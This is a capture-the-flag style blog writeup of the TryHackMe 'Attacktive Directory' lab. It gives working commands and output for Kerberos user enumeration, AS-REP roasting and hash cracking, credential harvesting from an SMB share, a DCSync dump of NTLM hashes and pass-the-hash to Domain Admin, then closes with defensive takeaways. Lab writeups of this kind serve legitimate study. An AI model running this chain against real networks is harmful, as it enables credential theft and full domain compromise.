---
title: "Attacktive Directory — TryHackMe Writeup"
date: 2026-08-09
draft: false
tags: ["Active Directory", "Kerberos", "Windows", "TryHackMe", "Pentesting"]
categories: ["Writeups", "TryHackMe"]
featureimage: "https://t3.ftcdn.net/jpg/03/68/72/50/240_F_368725089_Pm6rqgl9PY4fkovy8MlZQrzeX2GmAXnP.jpg"
---
 

## Introduction 

Attacktive Directory is a Windows Active Directory box on TryHackMe that walks through a full AD attack chain from unauthenticated enumeration to Domain Admin. I used `enum4linux` and `kerbrute` to enumerate valid domain users, performed AS-REP Roasting against a Kerberos pre-authentication–disabled account to grab a crackable hash, pivoted through an exposed SMB share to recover plaintext credentials, and finished by dumping the NTDS.dit database via DRSUAPI to obtain the Administrator's NTLM hash, then used Pass-the-Hash with Evil-WinRM to get a shell as Domain Admin.

> **Disclaimer:** This writeup documents a room completed on [TryHackMe](https://tryhackme.com/room/attacktivedirectory) shared strictly for **educational purposes** — to document my learning process and demonstrate my understanding of Active Directory attack techniques. All activity was performed in an isolated, intentionally vulnerable lab environment with explicit authorization from the platform.

## Phase 1: Environment Setup

I deployed the target through TryHackMe's OpenVPN access and connected using Kali Linux running in VirtualBox. Before starting, I installed the core tooling I'd need for AD attacks:

- **Impacket** — cloned from GitHub and installed for the Kerberos/SMB attack scripts (`GetNPUsers.py`, `secretsdump.py`, etc.)
- **BloodHound & Neo4j** — installed via `apt` for AD relationship mapping

```bash
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt

apt install bloodhound neo4j

## Phase 2: Initial Reconnaissance 

I started with a standard service/version scan against the target:

```bash
nmap -sV -sC 10.10.18.130
```
```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 09:55 EDT
Nmap scan report for 10.10.18.130
Host is up (0.18s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-29 13:56:53Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  tcpwrapped
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  tcpwrapped
3269/tcp open  tcpwrapped
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-10-28T13:53:24
|_Not valid after:  2026-04-29T13:53:24
5985/tcp open  tcpwrapped
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan revealed a Windows host running a full Active Directory stack: DNS (53), Kerberos (88), RPC (135), NetBIOS/SMB (139/445), LDAP (389), and WinRM (5985), among others. Port 445/139 being open pointed me toward SMB enumeration next.

To enumerate the SMB service further, I used `enum4linux`:

```bash
enum4linux -a 10.10.18.130
```

```text
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct 29 10:09:28 2025

                     ( Target Information )

Target ........... 10.10.18.130
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

                     ( Enumerating Workgroup/Domain on 10.10.18.130 )

[E] Can't find workgroup/domain

                     ( Nbtstat Information for 10.10.18.130 )

Looking up status of 10.10.18.130
No reply from 10.10.18.130

                     ( Session Check on 10.10.18.130 )

[+] Server 10.10.18.130 allows sessions using username '', password ''

                     ( Getting domain SID for 10.10.18.130 )

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

                     ( OS information on 10.10.18.130 )

[E] Can't get OS info with smbclient
[+] Got OS info for 10.10.18.130 from srvinfo:
```

This confirmed the host was part of a domain (not a workgroup) and returned the **NetBIOS domain name: `THM-AD`**. It's worth noting that `.local` is a commonly (and incorrectly) used TLD for internal AD domains — a detail that's often useful for identifying AD environments during recon on a wider network.

## Phase 4: Enumerating Users via Kerberos

With a domain name in hand, I moved on to user enumeration using `kerbrute`, which abuses Kerberos pre-authentication responses to validate usernames without triggering account lockouts the way SMB/LDAP brute-forcing might.

```bash
kerbrute userenum --dc 10.10.155.121 -d THM-AD userlist.txt
```

```text
Version: v1.0.3 (9dad6e1) - 10/30/25 - Ronnie Flathers @ropnop

2025/10/30 16:50:57 >  Using KDC(s):
2025/10/30 16:50:57 >  10.10.155.121:88

2025/10/30 16:50:59 >  [+] VALID USERNAME:       james@THM-AD
2025/10/30 16:51:22 >  [+] VALID USERNAME:       svc-admin@THM-AD
2025/10/30 16:51:34 >  [+] VALID USERNAME:       James@THM-AD
2025/10/30 16:51:48 >  [+] VALID USERNAME:       robin@THM-AD
2025/10/30 16:52:39 >  [+] VALID USERNAME:       darkstar@THM-AD
2025/10/30 16:53:04 >  [+] VALID USERNAME:       administrator@THM-AD
2025/10/30 16:53:56 >  [+] VALID USERNAME:       backup@THM-AD
2025/10/30 16:54:17 >  [+] VALID USERNAME:       paradox@THM-AD
2025/10/30 16:56:22 >  [+] VALID USERNAME:       JAMES@THM-AD
2025/10/30 16:57:01 >  [+] VALID USERNAME:       Robin@THM-AD
2025/10/30 17:01:29 >  [+] VALID USERNAME:       Administrator@THM-AD
2025/10/30 17:12:12 >  [+] VALID USERNAME:       Darkstar@THM-AD
```

This returned a list of valid usernames, including standard accounts like `james`, `robin`, and `administrator` — but two accounts stood out immediately as high-value targets: **`svc-admin`** and **`backup`**. Service accounts and accounts with "backup" in the name are classic AD misconfiguration red flags, often over-privileged or configured with weak/static passwords.

## Phase 5: Abusing Kerberos — AS-REP Roasting

Some accounts can be configured with Kerberos pre-authentication disabled — meaning anyone can request a ticket for that account without proving they know its password first. This is AS-REP Roasting. I checked `svc-admin` and confirmed it could be queried without a password:

```bash
python3 GetNPUsers.py THM-AD/svc-admin -no-pass -dc-ip 10.10.81.17
```

```text
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@THM-AD:39880c820818134bae82490fbf162501$ab1c8c0b27bf5bf8d5e61eecd74bb1c7bd8dbf3d0db6ce0d53e20dc4485f711d25ea5e96e36fb0f4f526d947f0917bda4uda1359bb8b02d1a9a71308887b34c785a5c73125d6a54s1aaa8f715aaa75ec5c61d44w0c10daae7be96a1d09f1334b7ba5169f4f89b30c5b82389e1854c655a2145a758d6d84f6e09d576d027e7e1045b485cf28c07204d9976a0b1914433afcd25d03011ef88fc0b0438ca3f81b7ece4f4cb0666b1a8eb54395794790e6fbabca25fd986d897bce2dd88039b98a4b34b0e653ac1978abbb35a293feb378e3ad2036d5a23b93d110063a720fbf1451e7252dc4181f4df51ee42fc
```

I saved the hash to `hash.txt` and cracked it offline. This returned a **Kerberos 5 AS-REP etype 23** hash (Hashcat mode `18200`). I cracked it with John the Ripper against the provided wordlist:

```bash
john --wordlist=/home/kali/Downloads/rockyou.txt --rules hash.txt
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005          (svc-admin)
1g 0:00:03:35 DONE (2025-10-31 06:58) 0.004630g/s 27032p/s 27032c/s 27032C/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I also verified the hash type and mode against Hashcat, which agreed on mode `18200`:

```bash
hashcat -m 18200 -a 0 hash.txt rockyou.txt
```

```text
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+devel  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

* Device #1: cpu-haswell-Intel(R) Core(TM) i5-4300M CPU @ 2.60GHz, 708/1480 MB (256 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
```

This recovered the plaintext password for `svc-admin` (`management2005`), giving me a foothold set of valid domain credentials.

## Phase 6: SMB Share Enumeration

With valid credentials, I moved to enumerating SMB shares using `smbclient`. First, I added the domain to my local hosts file to resolve it properly:

```bash
echo "10.10.71.247 spookysec.local" >> /etc/hosts
smbclient -L spookysec.local --user svc-admin
```

```text
Password for [WORKGROUP\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

This listed six shares. The `backup` share stood out — non-default share names are always worth investigating first. Connecting to it revealed a text file:

```bash
smbclient \\\\spookysec.local\\backup --user svc-admin
```

```text
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096, 3559168 blocks available

smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
```

Inside was a Base64-encoded string. Decoding it revealed a second set of plaintext credentials for the `backup` account:

```bash
cat backup_credentials.txt
base64 -d backup_credentials.txt
```

```text
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
backup@spookysec.local:backup2517860
```

This is a good real-world lesson: credentials left in plaintext (even encoded) on accessible shares are a common and serious misconfiguration in production AD environments.

## Phase 7: Elevating Privileges — Dumping NTDS.dit

The `backup` account, by design in many AD environments, often holds replication rights that allow it to perform a **DCSync** attack — impersonating a Domain Controller to request password data via the **DRSUAPI** method. Using Impacket's `secretsdump.py` with the recovered `backup` credentials, I dumped the domain's NTDS.dit database remotely:

```bash
cd /opt/impacket/examples
python3 secretsdump.py THM-AD/backup:backup2517860@10.10.59.211 -dc-ip 10.10.59.211
```

```text
Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed0986103302 6be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
```

This returned NTLM hashes for every domain account, including the **Administrator** account (`0e0363213e37b94221497260b0bcb4fc`) — full domain compromise.

## Phase 8: Domain Compromise — Pass-the-Hash

With the Administrator's NTLM hash in hand, I didn't need the plaintext password at all. I used **Evil-WinRM**'s `-H` flag to authenticate via **Pass-the-Hash**, a technique that lets an attacker authenticate using the hash directly rather than cracking it first:

```bash
evil-winrm -i 10.10.59.211 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```text
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

This dropped me into a shell as `thm-ad\administrator` — full Domain Admin access.

## Phase 9: Flag Capture

Flags were located on each compromised user's desktop and retrieved via `cat` over the Evil-WinRM session:

```bash
*Evil-WinRM* PS C:\Users\Administrator> cd \users\svc-admin\Desktop
*Evil-WinRM* PS C:\users\svc-admin\Desktop> ls
*Evil-WinRM* PS C:\users\svc-admin\Desktop> cat user.txt.txt
```

```text
    Directory: C:\users\svc-admin\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----          4/4/2020  12:18 PM             28 user.txt.txt

[REDACTED]
```

```bash
*Evil-WinRM* PS C:\users\svc-admin\Desktop> cd \users\backup\Desktop
*Evil-WinRM* PS C:\users\backup\Desktop> ls
*Evil-WinRM* PS C:\users\backup\Desktop> cat PrivEsc.txt
```

```text
    Directory: C:\users\backup\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----          4/4/2020  12:19 PM             26 PrivEsc.txt

[REDACTED]
```

```bash
*Evil-WinRM* PS C:\users\backup\Desktop> cd \users\Administrator\Desktop
*Evil-WinRM* PS C:\users\Administrator\Desktop> ls
*Evil-WinRM* PS C:\users\Administrator\Desktop> cat root.txt
```

```text
    Directory: C:\users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----          4/4/2020  11:39 AM             32 root.txt

[REDACTED]
```

- `svc-admin` — Kerberos pre-authentication flag: `[REDACTED]`
- `backup` — Privilege escalation flag: `[REDACTED]`
- `Administrator` — Domain Admin flag: `[REDACTED]`

## Phase 10: Key Takeaways

This room tied together an end-to-end AD attack chain that mirrors real-world engagements:

1. **Unauthenticated enumeration matters.** `enum4linux` and `kerbrute` gave up a domain name and valid usernames without needing a single credential.
2. **AS-REP Roasting is a low-noise win.** Any account with Kerberos pre-auth disabled is crackable offline with zero interaction with the DC beyond the initial request.
3. **Misconfigured shares leak credentials.** The `backup` share should never have been readable by a low-privileged service account, let alone contain plaintext credentials.
4. **DCSync rights are dangerous in the wrong hands.** Any account with replication permissions is effectively equivalent to Domain Admin — this should be tightly scoped and monitored.
5. **Pass-the-Hash means cracking isn't always necessary.** Once you have an NTLM hash, you may not need the plaintext password at all.

From a defensive standpoint, this room is a strong case for enforcing Kerberos pre-authentication on all accounts, auditing share permissions regularly, and monitoring for DCSync-capable accounts and unusual replication requests.

## References

- TryHackMe — [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
- MITRE ATT&CK — [T1558.004: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- MITRE ATT&CK — [T1003.006: DCSync](https://attack.mitre.org/techniques/T1003/006/)
- MITRE ATT&CK — [T1550.002: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- Impacket — [github.com/fortra/impacket](https://github.com/fortra/impacket)
